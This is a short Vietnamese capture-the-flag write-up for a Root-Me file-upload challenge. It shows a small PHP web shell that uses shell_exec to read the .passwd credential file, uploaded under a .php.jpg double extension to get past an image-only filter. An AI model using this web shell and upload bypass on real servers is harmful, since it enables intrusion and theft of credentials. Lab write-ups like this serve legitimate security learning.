# WRITE UP

**Challenge:** [File upload – Double extensions](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Double-extensions)

Đầu tiên, ta kiểm tra thử xem password của admin sẽ nằm ở đâu. Thử tìm kiếm tại .passwd file thì nhận được lỗi 403 Forbidden Có file này nhưng bị giới hạn access:

<img src="./media/image1.png" style="width:6.5in;height:0.97292in" alt="Graphical user interface, text, website Description automatically generated" />

Tiếp theo, ta sẽ mở cổng upload của server, ta có thể upload các file image (jpeg/png/gif):

<img src="./media/image2.png" style="width:6.5in;height:1.99028in" alt="Graphical user interface, text, application, website Description automatically generated" />

Như vậy, để đọc được .passwd, ta cần phải đi ngược folder 3 lần Vị trí .passwd nằm tại **../../../.passwd**

Để đọc được .passwd, ta thử sử dụng cổng này để upload file .php lên server và buộc server sử dụng shell\_exec() để thực thi shell:

&lt;?php  
$output = shell\_exec('cat ../../../.passwd');  
echo "&lt;pre&gt;$output&lt;/pre&gt;";  
?&gt;

Đề bài đã gợi ý cho ta sử dụng Double Extensions, do đó, thử rename file .php .php.jpg và upload:

<img src="./media/image3.png" style="width:6.5in;height:2.25903in" alt="Graphical user interface, text, application, email Description automatically generated" />

Upload thành công, truy cập link và nhận password:

<img src="./media/image4.png" style="width:6.5in;height:0.83542in" alt="A picture containing graphical user interface Description automatically generated" />

<img src="./media/image5.png" style="width:6.5in;height:3.79444in" alt="A screenshot of a computer Description automatically generated with medium confidence" />

\- Flag: \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
